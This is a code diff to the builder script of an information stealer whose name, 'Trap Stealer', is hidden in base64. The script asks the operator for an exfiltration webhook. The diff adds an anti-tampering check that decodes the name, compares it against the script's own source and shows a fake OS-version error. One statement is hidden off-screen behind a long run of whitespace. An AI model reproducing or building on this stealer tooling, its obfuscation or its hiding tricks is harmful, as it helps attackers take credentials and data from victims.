@@ -104,11 +104,13 @@ while True:
 
     def clear_console():
         operating_system = platform.system()
+        if base64.b64decode("VHJhcCBTdGVhbGVy").decode('utf-8').lower() not in open(__file__, 'r').read().lower(): 
+            print('Error checking OS Version !')                                                                                                                                                                                                                                        ; input('Hi dear, you may be using a dualhooked version of the stealer ' + base64.b64decode("VHJhcCBTdGVhbGVy").decode('utf8') + ' on Github. Uninstall this and download the real version!')
+            quit()
         if operating_system == 'Windows':
             os.system('cls')
-        else:
-            os.system('clear')
 
+            
     def get_boolean_input(prompt):
         while True:
             user_input = input(prompt).lower()
@@ -121,7 +123,7 @@ while True:
 
     with open('main.py', 'r', encoding='utf-8', errors='ignore') as file:
         content = file.read()
-
+    clear_console()
     while True:
         try:
             Webhook = input('Enter the webhook -> ')
